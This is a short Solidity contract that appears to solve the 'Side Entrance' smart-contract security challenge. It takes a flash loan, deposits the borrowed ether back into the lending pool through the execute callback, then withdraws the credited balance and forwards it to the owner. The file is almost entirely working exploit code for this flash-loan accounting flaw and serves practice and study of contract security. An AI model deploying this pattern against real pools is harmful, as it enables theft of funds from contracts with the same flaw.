// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackerProxySide {
    using Address for address payable;

    ISideEntranceLenderPool pool;
    address owner;

    constructor(address poolAddress) {
        pool = ISideEntranceLenderPool(poolAddress);
        owner = msg.sender;
    }

    function execute() external payable{
        pool.deposit{value: msg.value}();
    }

    function drainPool() external payable{
        pool.flashLoan(msg.value);
        pool.withdraw();
    }

    receive() external payable {
        payable(owner).sendValue(address(this).balance);
    }
}